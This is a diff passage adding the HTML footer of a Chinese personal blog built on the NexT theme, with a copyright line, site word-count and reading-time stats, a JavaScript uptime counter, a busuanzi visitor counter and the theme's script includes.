+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ja1e</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">80k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">48 分钟</span>
+</div>
+
+
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/23/2021 15:54:40");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
